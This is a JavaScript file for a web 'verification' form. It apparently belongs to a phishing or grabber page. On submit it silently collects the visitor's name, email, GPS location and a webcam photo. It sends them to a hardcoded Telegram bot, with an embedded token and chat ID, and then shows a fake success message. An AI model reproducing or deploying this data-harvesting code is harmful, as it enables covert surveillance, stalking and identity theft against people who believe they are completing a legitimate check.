document.getElementById('verification-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    // Get form data
    const formData = new FormData(e.target);
    const userInfo = {
        name: formData.get('name'),
        email: formData.get('email'),
        timestamp: new Date().toISOString()
    };
    
    try {
        // Get location
        const location = await getCurrentLocation();
        userInfo.location = location;
        
        // Capture photo
        const photoData = await capturePhoto();
        userInfo.photo = photoData;
        
        // Send data to Telegram bot
        await sendToTelegram(userInfo);
        
        alert('Verification completed successfully!');
    } catch (error) {
        console.error('Error:', error);
        alert('An error occurred during verification.');
    }
});

function getCurrentLocation() {
    return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
            position => resolve({
                lat: position.coords.latitude,
                lng: position.coords.longitude
            }),
            error => reject(error)
        );
    });
}

async function capturePhoto() {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    
    return new Promise((resolve, reject) => {
        setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            const dataUrl = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(track => track.stop());
            resolve(dataUrl);
        }, 1000);
    });
}

async function sendToTelegram(data) {
    const response = await fetch('https://api.telegram.org/bot8761461166:AAGJSUvTctDDs0j7kKCIC-gY-7cc2WMnYvM/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: '6866229974',
            text: JSON.stringify(data, null, 2)
        })
    });
    
    if (!response.ok) throw new Error(`Telegram API error: ${response.status}`);
}
